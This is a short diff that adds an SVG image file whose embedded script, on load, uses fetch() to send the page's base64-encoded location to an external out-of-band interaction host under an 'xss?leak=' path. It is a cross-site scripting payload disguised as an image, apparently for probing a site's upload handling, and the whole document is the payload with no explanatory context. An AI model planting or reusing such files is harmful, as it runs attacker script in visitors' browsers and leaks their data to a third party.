@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch('https://kotfxrgkoiscjimuimjw06yhlu0n2l4rc.oast.fun/xss?leak='+btoa(document.location))
+  </script>
+</svg>
